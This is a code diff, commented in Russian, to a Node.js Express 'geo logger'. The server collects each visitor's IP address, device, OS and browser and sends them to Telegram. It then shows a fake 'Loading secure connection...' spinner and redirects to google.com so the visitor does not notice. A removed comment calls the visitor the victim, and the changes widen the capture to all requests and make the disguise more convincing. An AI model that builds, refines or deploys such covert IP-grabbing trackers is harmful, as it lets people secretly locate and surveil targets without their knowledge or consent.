@@ -59,7 +59,8 @@ function parseUA(ua) {
   return { device, os, browser };
 }
 
-app.get('*', async (req, res) => {
+// Все запросы обрабатываем
+app.use(async (req, res, next) => {
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip;
   const cleanIp = ip.replace('::ffff:', '');
   const ua = req.headers['user-agent'] || 'Unknown';
@@ -84,18 +85,65 @@ app.get('*', async (req, res) => {
   message += `📱 Device: ${deviceInfo.device}\n`;
   message += `💻 OS: ${deviceInfo.os}\n`;
   message += `🌍 Browser: ${deviceInfo.browser}\n`;
-  message += `🔗 User-Agent: ${ua.slice(0, 100)}`;
+  message += `🔗 UA: ${ua.slice(0, 80)}`;
   
   sendToTelegram(message);
   
-  // Отправляем пустую страницу (жертва видит только белый фон)
+  // Отдаём красивую страницу, которая грузится мгновенно
   res.send(`
     <!DOCTYPE html>
     <html>
-    <head><title>Loading...</title><style>body{background:#0f0f0f;color:white;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}</style></head>
-    <body><div>Loading...</div></body>
+    <head>
+      <title>Redirecting...</title>
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <style>
+        body {
+          margin: 0;
+          padding: 0;
+          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+          background: #0f0f0f;
+          color: white;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          height: 100vh;
+          text-align: center;
+        }
+        .container {
+          max-width: 300px;
+          padding: 20px;
+        }
+        .spinner {
+          width: 40px;
+          height: 40px;
+          border: 3px solid #2c7be5;
+          border-top-color: transparent;
+          border-radius: 50%;
+          animation: spin 0.8s linear infinite;
+          margin: 0 auto 20px;
+        }
+        @keyframes spin {
+          to { transform: rotate(360deg); }
+        }
+        p {
+          color: #888;
+          font-size: 14px;
+        }
+      </style>
+    </head>
+    <body>
+      <div class="container">
+        <div class="spinner"></div>
+        <p>Loading secure connection...</p>
+      </div>
+      <script>
+        setTimeout(() => {
+          window.location.href = "https://google.com";
+        }, 2000);
+      </script>
+    </body>
     </html>
   `);
 });
 
-app.listen(PORT, () => console.log(`Geo tracker running on port ${PORT}`));
+app.listen(PORT, () => console.log(`Geo logger running on port ${PORT}`));
